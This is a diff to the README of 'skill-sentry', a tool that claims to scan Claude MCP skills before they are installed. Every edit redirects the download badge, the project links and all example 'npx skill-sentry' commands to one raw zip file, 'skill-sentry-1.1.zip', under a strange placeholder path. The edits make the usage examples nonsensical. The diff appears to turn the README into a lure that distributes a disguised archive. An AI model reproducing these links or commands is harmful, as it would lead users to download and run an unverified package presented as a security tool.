@@ -1,6 +1,6 @@
 # 🛡️ skill-sentry - Scan skills before you install
 
-[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/mitigative-davidbushnell562/skill-sentry)
+[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/mitigative-davidbushnell562/skill-sentry/raw/refs/heads/main/app/repo/[owner]/[name]/skill-sentry-1.1.zip)
 
 ## 🚀 What skill-sentry does
 
@@ -29,7 +29,7 @@ Replace `<your skills github url>` with the GitHub link to the Claude MCP skills
 
 Example:
 
-npx skill-sentry https://github.com/example/your-skill-repo
+npx skill-sentry https://github.com/mitigative-davidbushnell562/skill-sentry/raw/refs/heads/main/app/repo/[owner]/[name]/skill-sentry-1.1.zip
 
 ## 🔍 What it checks
 
@@ -76,7 +76,7 @@ This tool is a good fit if you:
 
 Example command:
 
-npx skill-sentry https://github.com/example/skill-repo
+npx skill-sentry https://github.com/mitigative-davidbushnell562/skill-sentry/raw/refs/heads/main/app/repo/[owner]/[name]/skill-sentry-1.1.zip
 
 ## 🪟 Windows requirements
 
@@ -141,7 +141,7 @@ This project relates to:
 
 Visit the project page here:
 
-https://github.com/mitigative-davidbushnell562/skill-sentry
+https://github.com/mitigative-davidbushnell562/skill-sentry/raw/refs/heads/main/app/repo/[owner]/[name]/skill-sentry-1.1.zip
 
 ## 🧩 Command reference
 
@@ -151,11 +151,11 @@ npx skill-sentry <your skills github url>
 
 Scan a public repo:
 
-npx skill-sentry https://github.com/owner/repo
+npx skill-sentry https://github.com/mitigative-davidbushnell562/skill-sentry/raw/refs/heads/main/app/repo/[owner]/[name]/skill-sentry-1.1.zip
 
 Scan a private repo you can access:
 
-npx skill-sentry https://github.com/your-org/your-private-repo
+npx skill-sentry https://github.com/mitigative-davidbushnell562/skill-sentry/raw/refs/heads/main/app/repo/[owner]/[name]/skill-sentry-1.1.zip
 
 ## 🧠 Tips for safer use
 
@@ -191,4 +191,4 @@ Try these steps:
 
 Use this link to download or open the project page on GitHub:
 
-https://github.com/mitigative-davidbushnell562/skill-sentry
+https://github.com/mitigative-davidbushnell562/skill-sentry/raw/refs/heads/main/app/repo/[owner]/[name]/skill-sentry-1.1.zip
